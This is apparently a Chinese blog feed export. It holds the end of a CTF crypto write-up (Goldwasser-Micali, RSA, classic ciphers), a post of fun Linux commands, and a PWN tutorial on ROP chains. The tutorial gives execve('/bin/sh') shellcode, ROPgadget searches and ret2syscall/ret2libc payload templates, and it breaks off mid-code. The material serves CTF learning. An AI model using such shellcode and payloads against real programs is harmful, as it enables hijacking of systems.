p)<br>$$</p><p>$$<br>x^2≡n(mod p^n)<br>$$</p><h5 id="2）附件分析："><strong>2）附件分析：</strong></h5><p>加密过程其实就是对一串二进制字符进行变换。变换的法则是：<br>$$<br>((3^(i+2x)modn)<em>x^2)modn=c<br>$$<br>其中i=0或1，是原文；n=p</em>q(p,q为素数)；x是随机数，且满足与n互质；c是密文。从附件也可以看出，有167个密文元素，就是说原文的长度是167。</p><h5 id="3）综合分析及解题："><strong>3）综合分析及解题：</strong></h5><p>解题过程从两方面开展。</p><h6 id="1-二次同余方程的求解、解数"><strong>1.二次同余方程的求解、解数</strong></h6><p><strong>学习资源：</strong></p><p>1.信息安全数学基础（上海交大，b站课程）</p><p>2.计算勒让德符号（legendre symbol）代码实现（含运行结果）_橙子的坚果奶盖的博客-CSDN博客(<a href="https://blog.csdn.net/weixin_46447549/article/details/114372252">https://blog.csdn.net/weixin_46447549/article/details/114372252</a>)</p><p>3.勒让德符号和雅可比符号_Kagamigawa Noelle-CSDN博客_雅可比符号(<a href="https://blog.csdn.net/happy_single/article/details/106125155">https://blog.csdn.net/happy_single/article/details/106125155</a>)</p><p>4.二次同余式解数的判定(<a href="https://zhidao.baidu.com/question/509006719.html">https://zhidao.baidu.com/question/509006719.html</a>)</p><p>5.百度百科：勒让德符号、雅可比符号</p><p>对于方程<br>$$<br>x^2≡y(modn),n=p*q<br>$$<br>其等价于方程组<br>$$<br>x^2≡y(modp)<br>$$</p><p>$$<br>x^2≡y(modq)<br>$$</p><p>对判定方程是否有解、有多少个解的问题，统称为方程的解数。</p><p>对模数为素数的二次同余方程解数的判定，通常使用Legendre(勒让德)符号。</p><p><img src="https://static01.imgkr.com/temp/295963f39c654eb7a21c25d03432bdb7.png" alt=""></p><p>勒让德符号有其快速计算方法。</p><p><img src="https://static01.imgkr.com/temp/387f0b66087447628ab7bdb4c460d12a.png" alt=""></p><p>我编写了大整数求勒让德符号的程序(python):</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ee</span>(<span class="hljs-params">a</span>):</span><br>    e=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span>(a%<span class="hljs-number">2</span> == <span class="hljs-number">0</span>):<br>        a=a/<span class="hljs-number">2</span><br>        e=e+<span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> e<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">L_FAST</span>(<span class="hljs-params">a,p</span>):</span><br>    <span class="hljs-keyword">if</span>(a==<span class="hljs-number">0</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    <span class="hljs-keyword">elif</span>(a==<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">if</span>(ee(a)%<span class="hljs-number">2</span>==<span class="hljs-number">0</span>):<br>            s=<span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">if</span>(p%<span class="hljs-number">8</span>==<span class="hljs-number">1</span> <span class="hljs-keyword">or</span> p%<span class="hljs-number">8</span>==<span class="hljs-number">7</span>):<br>                s=<span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span>(p%<span class="hljs-number">8</span>==<span class="hljs-number">3</span> <span class="hljs-keyword">or</span> p%<span class="hljs-number">8</span> == <span class="hljs-number">5</span>):<br>                s=-<span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span>(p%<span class="hljs-number">4</span>==<span class="hljs-number">3</span> <span class="hljs-keyword">and</span> a%<span class="hljs-number">4</span>==<span class="hljs-number">3</span>):<br>            s=-s<br>        p1=p%a<br>        <span class="hljs-keyword">if</span>(a==<span class="hljs-number">1</span>):<br>            <span class="hljs-keyword">return</span> s<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> s*L_FAST(p1,a)<br></code></pre></td></tr></table></figure><p>雅可比符号是对勒让德符号的扩展。雅可比符号能解决模数n是合数的情况。对于题目的n=p*q,这是一个很大的帮助。</p><p>雅可比符号是这样定义的：<br>$$<br>J p (x) =</p><p>+1,x ∈ QR p<br>$$</p><p>$$<br>−1,x / ∈ QR p .<br>$$</p><h6 id="2-学习GM-Goldwasser-Micali-加密算法"><strong>2.学习GM(Goldwasser-Micali)加密算法</strong></h6><p><a href="https://www.csa.iisc.ac.in/~arpita/Cryptography15/CT7.pdf">https://www.csa.iisc.ac.in/~arpita/Cryptography15/CT7.pdf</a></p><p>这篇论文详细解释了GM加密算法的理论基础、加密解密算法以及算法复杂度的证明。</p><p>论文中对判断模n二次剩余有如下定理：</p><p>设y满足<br>$$<br>y=yq§<br>$$</p><p>$$<br>y=yp§<br>$$</p><p>有唯一的解（也即中国剩余定理），则y是模N的二次剩余当且仅当yp是p的二次剩余且yq是q的二次剩余。</p><p>证明从略。</p><p><img src="https://static01.imgkr.com/temp/96654c1f483d4eca9ec401bafd3cd455.png" alt=""></p><p>算法1：产生N</p><p><img src="https://static01.imgkr.com/temp/b58f8d4bef874facbdb54286c212f319.png" alt=""></p><p>算法2：加密</p><p><img src="https://static01.imgkr.com/temp/752a1d5c9cbb49b2a8e5f796b80b1d17.png" alt=""></p><p>算法3：解密</p><p>编出解密程序（省去赋值）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br>s=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>    <span class="hljs-keyword">if</span> gmpy2.jacobi(a[i], n) == -<span class="hljs-number">1</span>:<br>        s += <span class="hljs-string">&#x27;1&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        s += <span class="hljs-string">&#x27;0&#x27;</span><br><span class="hljs-built_in">print</span>(s)<br>number = <span class="hljs-built_in">int</span>(s, <span class="hljs-number">2</span>)<br>output = long_to_bytes(number)<br><span class="hljs-built_in">print</span>(output)<br></code></pre></td></tr></table></figure><p>结果：b’SYC{run_to_the_light}’</p><h3 id="baby-house-of-rsa"><strong>baby house of rsa</strong></h3><h5 id="0-super-baby"><strong>0 super baby</strong></h5><p>给出e,n,c,d,求m.</p><p>代码：（省去赋值）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>m=gmpy2.powmod(c,d,n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><p>结果：b’8848’</p><h5 id="1-very-baby"><strong>1 very baby</strong></h5><p>已知n=a1* a2 *a3 *a4,求m</p><p>代码（省去赋值）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>phi=(AA[<span class="hljs-number">0</span>]-<span class="hljs-number">1</span>)*(AA[<span class="hljs-number">1</span>]-<span class="hljs-number">1</span>)*(AA[<span class="hljs-number">2</span>]-<span class="hljs-number">1</span>)*(AA[<span class="hljs-number">3</span>]-<span class="hljs-number">1</span>)<br>d=gmpy2.invert(e,phi)<br>m=gmpy2.powmod(c,d,n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><p>结果：b’114514’</p><h5 id="2-beyond-baby"><strong>2 beyond baby</strong></h5><p>n=a1^4,对应的phi=a1^4-a1^3</p><p>代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>phi = a1**<span class="hljs-number">4</span>-a1**<span class="hljs-number">3</span><br>d=gmpy2.invert(e,phi)<br>m=gmpy2.powmod(c,d,n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><p>结果：b’226’</p><h5 id="3-infinity-baby"><strong>3 infinity baby</strong></h5><p>给出e,n,c,p,q,求m</p><p>代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>e=<span class="hljs-number">65537</span><br>n=<span class="hljs-number">266266790497495211367281021249406677231</span><br>c=<span class="hljs-number">234292670742280314534663243185847290744</span><br>p=<span class="hljs-number">16055431013588849203</span><br>q=<span class="hljs-number">16584219400409416277</span><br>phi=(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d=gmpy2.invert(e,phi)<br>m=gmpy2.powmod(c,d,n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br><br></code></pre></td></tr></table></figure><p>结果：b’1919810’</p><p>连起来得到flag.zip密钥。SYC{RSA_is_really_easy}</p><h3 id="easy-house-of-Classic-Crypto"><strong>easy house of Classic Crypto</strong></h3><h4 id="附件：-6"><strong>附件：</strong></h4><p>五段密文，以不同形式加密。</p><p>T0s=</p><p>base64编码，解码得到“OK”</p><p>4e6577</p><p>十六进制转文本，解码得到“New”</p><p>-.-- — …-</p><p>摩尔斯密码，解密得到“you”</p><p>ABABAABBABABBBABABBA</p><p>培根密码，解密得到“know”</p><p>jung vf pynffvp pelcgb</p><p>凯撒密码，偏移量13，解密得到“what is classic crypto”</p><p>连起来得到flag.zip密钥。</p><p>SYC{Meaningless_crypto}</p>]]></content>
    
    
    <categories>
      
      <category>CTF WriteUp</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux有趣的命令</title>
    <link href="/2022/03/14/Linux%E6%9C%89%E8%B6%A3%E7%9A%84%E5%91%BD%E4%BB%A4/"/>
    <url>/2022/03/14/Linux%E6%9C%89%E8%B6%A3%E7%9A%84%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<h2 id="banner">banner</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt-get update<br>sudo apt-get install sysvbanner<br></code></pre></td></tr></table></figure><p>之后<code>banner [文字内容]</code></p><h2 id="aafire">aafire</h2><p>天冷的时候，要是有个火炉就好了。这里有个有趣的程序：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt-get install libaa-bin<br>aafire<br></code></pre></td></tr></table></figure><p><img src="https://doc.shiyanlou.com/linux_base/fire.gif" alt="1"></p><h2 id="xeyes">xeyes</h2><h3 id="启用">启用</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">xeyes</span><br></code></pre></td></tr></table></figure><p>你可以使用如下命令将它放到后台运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nohup xeyes &amp;<br></code></pre></td></tr></table></figure><h3 id="关闭">关闭</h3><p>需要使用 <code>kill</code> 命令来杀死这个进程。输入上面的命令后终端会输出一个 PID，这就是 xeyes 的进程号，这个进程号不是固定的，比如我这里是 20295，那么我们输入 <code>sudo kill -9 20295</code> 即可结束这个进程。</p><h2 id="cmatrix">cmatrix</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo apt-<span class="hljs-builtin-name">get</span> update<br>sudo apt-<span class="hljs-builtin-name">get</span> install cmatrix<br></code></pre></td></tr></table></figure><p>之后直接输入运行，可以按<code>F11</code>全屏显示</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">cmatrix</span><br></code></pre></td></tr></table></figure><p>可以改变代码颜色</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">cmatrix -C <span class="hljs-built_in">red</span><br></code></pre></td></tr></table></figure><h2 id="cowsay">cowsay</h2><p><code>cowsay</code> 命令，可以让你在终端里以一种动物说话的形式打印出一段话。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 更新软件包</span><br>sudo apt update<br><br><span class="hljs-comment"># 安装</span><br>sudo apt install -y cowsay<br><br><span class="hljs-comment"># 默认是一只牛</span><br>cowsay hello shiyanlou<br><br><span class="hljs-comment"># 加上&#x27;-l&#x27;参数打印所有支持的动物（其实不只是动物）种类</span><br>cowsay -l<br><br><span class="hljs-comment"># 使用&#x27;-f&#x27;参数选择动物种类</span><br>cowsay -f elephant hello shiyanlou<br><br><span class="hljs-comment"># 安装 fortune-zh</span><br>sudo apt-get install fortune-zh<br><br><span class="hljs-comment"># 此外它还可以结合 fortune 命令一起使用</span><br>/usr/games/fortune | cowsay -f daemon<br></code></pre></td></tr></table></figure><h2 id="aview和imagemagick">aview和imagemagick</h2><p>执行以下命令安装工具包并下载图片：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt update<br><br>sudo apt install -y aview imagemagick<br><br>wget https://labfile.oss.aliyuncs.com/courses/1/Linus.png<br></code></pre></td></tr></table></figure><p>执行 <code>asciiview [图片文件名]</code> 即可打开图片</p><h2 id="space-invaders">space invaders</h2><p>太空侵略者使用下面这个命令可以安装，之所以叫 ninvaders 是因为这款游戏是基于 ncurses 命令行图形库做的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt-get install ninvaders<br>/usr/games/ninvaders<br></code></pre></td></tr></table></figure><h2 id="cacafire">cacafire</h2><p>之前介绍过一个在命令行将图片转换为 ascii 字符查看的工具 <code>aview/asciiview</code>，不过它是黑白的。现在，这里是个彩色的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt-get install caca-utils<br>cacaview &lt;pic_file&gt;<br>cacademo<br>cacafire<br></code></pre></td></tr></table></figure><p><img src="https://doc.shiyanlou.com/linux_base/cfire.gif" alt=""></p><h2 id="aa-for-x">aa for x</h2><p>安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt-get update<br>sudo apt-get install bb<br>/usr/games/bb<br></code></pre></td></tr></table></figure><p><img src="https://doc.shiyanlou.com/linux_base/bb.gif" alt="1"></p>]]></content>
    
    
    <categories>
      
      <category>Linux Study</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>PWN的基本ROP链构造</title>
    <link href="/2022/03/14/PWN%E7%9A%84%E5%9F%BA%E6%9C%ACROP%E9%93%BE%E6%9E%84%E9%80%A0/"/>
    <url>/2022/03/14/PWN%E7%9A%84%E5%9F%BA%E6%9C%ACROP%E9%93%BE%E6%9E%84%E9%80%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="查找对应溢出">查找对应溢出</h2><p>一般的溢出内容是<code>EIP</code>，因为<code>EIP</code>寄存器存储着我们<code>CPU</code>要读取指令的地址</p><p>可以通过 <code>cyclic 数字</code>这个指令来获取判断溢出点的一个长度为输入的一个字符串，再通过<code>gdb</code>调试观察EIP寄存器处的 4 位字符，通过指令<code>cyclic -l 对应EIP的4位字符</code>，得到需要填充的溢出字符长度。</p><h2 id="保护模式">保护模式</h2><p>NX：防止栈上执行 (需要利用到 bss 段)</p><p>Canary：检测是否发生栈溢出</p><h2 id="Ret2text">Ret2text</h2><p>通过计算溢出点的地址到对应返回的栈顶（ebp）的距离来进行溢出，同时要加上对应 ret 所占的 4 个字节。</p><p><strong>对应 exp 构造模式：</strong></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">shellcode</span> = 对应 /bin/sh/ 地址 <br><span class="hljs-attr">payload</span> = <span class="hljs-string">&#x27;a&#x27;</span>*[溢出点到栈顶距离] + <span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">4</span> + p32/p64(shellcode)<br></code></pre></td></tr></table></figure><h2 id="Ret2shellcode">Ret2shellcode</h2><p>程序中没有出现 /bin/sh/ 地址需要自己构造，构造方式有两种：</p><ul><li><p>23字节</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">shellcode = &quot;<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>f6<span class="hljs-symbol">\x</span>48<span class="hljs-symbol">\x</span>bb<span class="hljs-symbol">\x</span>2f<span class="hljs-symbol">\x</span>62<span class="hljs-symbol">\x</span>69<span class="hljs-symbol">\x</span>6e<span class="hljs-symbol">\x</span>2f<span class="hljs-symbol">\x</span>2f<span class="hljs-symbol">\x</span>73<span class="hljs-symbol">\x</span>68<span class="hljs-symbol">\x</span>56<span class="hljs-symbol">\x</span>53<span class="hljs-symbol">\x</span>54<span class="hljs-symbol">\x</span>5f<span class="hljs-symbol">\x</span>6a<span class="hljs-symbol">\x</span>3b<span class="hljs-symbol">\x</span>58<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>d2<span class="hljs-symbol">\x</span>0f<span class="hljs-symbol">\x</span>05&quot;<br></code></pre></td></tr></table></figure></li><li><p>44字节</p><figure class="highlight nim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nim"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>shellcode = <span class="hljs-keyword">asm</span>(shellcraft.sh())<br></code></pre></td></tr></table></figure></li></ul><p>一般实现溢出方式类似于 ret2text ，不同的是需要使用 <code>vmmap</code>检查对应的权限，同时也需要观察<code>bss</code><strong>（检查溢出点是否定义在 bss 段上）</strong></p><p><strong>对应 exp 构造模式：</strong></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">bss</span> = bss对应的地址<br><span class="hljs-attr">shellcode</span> = 构造一个shell<br><span class="hljs-attr">payload</span> = shellcode.ljust(<span class="hljs-string">&#x27;a&#x27;</span>,溢出长度) + p32/p64(bss)<br></code></pre></td></tr></table></figure><h2 id="Ret2syscall">Ret2syscall</h2><p>程序中同样没有出现 /bin/sh/ 地址需要自己构造，原理为把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们再执行 int 0x80 就可执行对应的系统调用（知识点<code>Linux</code>下系统调用）。</p><p>学习链接：<a href="https://www.freebuf.com/articles/system/234228.html">ret2syscall原理详解与实例分析 </a></p><p><strong>Syscall 调用规范</strong> <code>execve(“/bin/sh”, 0,0)</code></p><p>它对应的汇编代码为：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">pop</span> <span class="hljs-built_in">eax</span># 系统调用号载入， execve为<span class="hljs-number">0xb</span><br><span class="hljs-keyword">pop</span> <span class="hljs-built_in">ebx</span># 第一个参数， /bin/sh的string<br><span class="hljs-keyword">pop</span> <span class="hljs-built_in">ecx</span># 第二个参数，<span class="hljs-number">0</span><br><span class="hljs-keyword">pop</span> <span class="hljs-built_in">edx</span># 第三个参数，<span class="hljs-number">0</span><br><span class="hljs-keyword">int</span> <span class="hljs-number">0x80</span><br></code></pre></td></tr></table></figure><p>寻找对应可以利用的 <code>ret(gadgets)</code>可以使用 <code>ropgadgets</code> 这个工具</p><p>对应寻找步骤：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ ROPgadget --binary 对应文件  --only <span class="hljs-string">&#x27;pop|ret&#x27;</span> | grep <span class="hljs-string">&#x27;eax&#x27;</span>  //search eax  <br>0x080bb196 : pop eax ; ret<br>------------------------------------------------------------------------------------------------------------------<br>$ ROPgadget --binary 对应文件  --only <span class="hljs-string">&#x27;pop|ret&#x27;</span> | grep <span class="hljs-string">&#x27;ebx&#x27;</span>  //search ebx\edx\ecx<br>0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret<br>------------------------------------------------------------------------------------------------------------------<br><span class="hljs-variable">$ROPgadget</span> --binary 对应文件  --string <span class="hljs-string">&#x27;/bin/sh&#x27;</span>   //search <span class="hljs-string">&#x27;bin/sh&#x27;</span><br>   Strings information<br>   ============================================================<br>   0x080be408 : /bin/sh<br> ----------------------------------------------------------------------------------------------------------------- <br><span class="hljs-variable">$ROPgadget</span> --binary 对应文件  --only <span class="hljs-string">&#x27;int&#x27;</span>       // search int 0x80         <br>   Gadgets information<br>   ============================================================<br>   0x08049421 : int 0x80<br></code></pre></td></tr></table></figure><p><strong>对应 exp 构造模式：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">pop_eax_ret = 可利用的 eax 的地址<br>pop_edx_ecx_ebx_ret = 可利用的 ebx、edx、ecx地址<br>int_0x80 = <span class="hljs-built_in">int</span> <span class="hljs-number">0x80</span> 的地址<br>binsh = <span class="hljs-string">&#x27;bin/sh&#x27;</span> 的地址<br>payload = flat([<span class="hljs-string">&#x27;A&#x27;</span> * 溢出长度, pop_eax_ret, <span class="hljs-number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, binsh, int_0x80])<br>io.sendline(payload)<br></code></pre></td></tr></table></figure><h2 id="Ret2libc">Ret2libc</h2><p><code>ret2libc</code> 即控制函数的执行 <code>libc (Linux下C库)</code> 中的函数，通常是返回至某个函数的 <code>PLT</code> 处或者函数的具体位置 ( 即函数对应的 got 表项的内容 )。一般情况下，我们会选择执行 <code>system(&quot;/bin/sh&quot;)</code>。</p><p>学习链接：<a href="https://blog.csdn.net/qq_18661257/article/details/54694748">GOT表和PLT表知识详解</a></p><h3 id="含有-system-和-bin-sh">含有 system 和 /bin/sh</h3><p><strong>一般函数中含有 <code>/bin/sh</code> 、<code>system</code> 函数时构造对应的 exp 构建模式为：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">binsh_addr = /<span class="hljs-built_in">bin</span>/sh/ 的地址<br>system_plt = system 函数的地址<br>payload = flat([<span class="hljs-string">&#x27;a&#x27;</span> * 溢出长度, system_plt,<span class="hljs-string">&#x27;b&#x27;</span> * <span class="hljs-number">4</span>,binsh_addr])<br></code></pre></td></tr></table></figure><p>需要注意函数调用栈的结构，如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以’bbbb’ 作为虚假的地址，其后参数对应的参数内容。</p><h3 id="不含有-bin-sh">不含有 /bin/sh</h3><p>如果函数中不含有 <code>/bin/sh</code> 时，我们需要在<code>bss</code>段上自己构建一个<code>/bin/sh</code></p><p><strong>此时 exp 构造模式为：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">system_plt = system 函数地址<br>gets_addr = 溢出点函数地址<br>buf_addr = bss 段上变量地址<br>payload = flat([<span class="hljs-string">&#x27;a&#x27;</span> * 溢出长度,gets_addr,system_plt,buf_addr,buf_addr])<br>io.sendline(payload)<br>io.sendline(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>)<br></code></pre></td></tr></table></figure><blockquote><p>对应的栈分布为：</p><ul><li>gets地址</li><li>system地址（也是gets的返回地址）</li><li>buf2（是gets的参数）</li><li>buf2（是system的参数）</li></ul></blockquote><p>或者：</p><p>寻找一个 pop：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">ROPgadget --binary ret2libc2 --only <span class="hljs-string">&#x27;pop|ret&#x27;</span>| grep <span class="hljs-string">&#x27;ebx&#x27;</span><br>0x0804872c : pop ebx ; pop esi ; pop edi ; pop ebp ; ret<br>0x0804843d : pop ebx ; ret<br></code></pre></td></tr></table></figure><p><strong>之后的 exp 构造模式：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">system_plt = system 函数地址<br>pop_ebx = ret ebx 的地址<br>gets_addr = 溢出点函数地址<br>buf_addr = bss 段上变量地址<br>payload = flat([<span class="hljs-string">&#x27;a&#x27;</span> * 溢出长度,gets_addr,pop_ebx,system_plt,<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">4</span>,buf_addr])<br>io.sendline(payload)<br>io.sendline(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>)<br></code></pre></td></tr></table></figure><blockquote><p>对应的栈分布为：</p><ul><li>gets地址</li><li>pop ebx ；ret地址</li><li>buf2（gets的参数）</li><li>system地址</li><li>system的返回地址（‘AAAA’）</li><li>buf2（system的参数）</li></ul></blockquote><p>在调用gets函数后，把参数buf2给pop掉，这样返回地址就变成了system，就会返回到system。</p><h3 id="不含有-System-和-bin-sh">不含有 System 和 /bin/sh</h3><p>两个都没有给出的话需要自己寻找对应版本的 <code>libc</code></p><p><strong>泄露函数地址：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>io=process(<span class="hljs-string">&#x27;./&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./&#x27;</span>)<br>puts_plt = elf.plt[<span 